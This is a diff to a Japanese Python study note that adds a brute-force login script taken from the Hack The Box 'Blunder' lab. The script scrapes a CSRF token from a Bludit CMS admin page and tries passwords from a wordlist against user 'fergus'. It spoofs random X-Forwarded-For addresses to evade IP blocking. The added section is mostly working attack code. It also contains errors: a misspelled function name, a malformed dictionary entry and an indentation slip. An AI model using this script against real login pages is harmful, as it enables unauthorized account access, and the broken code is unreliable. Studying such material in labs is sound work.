@@ -207,63 +207,64 @@ htmlコードとの対応に注目！
 詳細はこちら：[xml.etree.ElementTree --- ElementTree XML API](https://docs.python.org/ja/3/library/xml.etree.elementtree.html#module-xml.etree.ElementTree)
 
 
+# requestsとbruteforce
+
+headeresとはcookiesとかを考慮したスクリプト：
+
+```python
+import requests
+import re
+import random
+
+HOST = '10.10.10.191'
+USER = 'fergus'
+
+def init_sessoin():
+	# Return CSRF + Session (cookie)
+	r = requests.get(f'http://{HOST}/admin/')
+	csrf = re.search('input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+	csrf = csrf.group(1)
+	cookie = r.cookies.get('BLUDIT-KEY')
+	return csrf, cookie
 
 
+def login(user, password):
+	csrf, cookie = init_session()
+	# tokenCSRF=5bab7114907eaeb343bc44af6c5d730f7995dbdc&username=fergus&password=Password&save=
+	headers = {
+		'X-Forwarded-For': f'{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}'
+		}
+	data = {
+		'tokenCSRF': csrf,
+		'username': user,
+		'password': password,
+		'save'; ''
+		}
+	cookies = {
+		'BLUDIT-KEY': cookie
+		}
+ 	r = requests.post(f'http://{HOST}/admin/login.php', headers = headers, cookies = cookies, data = data, allow_redirects = False)
+
+	if r.status_code != 200:
+		print(f'{USER}:{password}')
+		# print('CSRF Error')
+	elif 'has been blocked' in r.text:
+		print('IP blocked')
+		return False
+	elif 'password incorrect' in r.text:
+		return False
+	else:
+		print(f'{user}:{password}')
+		return True
 
 
+wordlist = open('custwords.txt').readlines()
+for line in wordlist:
+	line = line.strip()
+	login('fergus', line)
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+（Hack The Box - Blunderより）
 
 
 
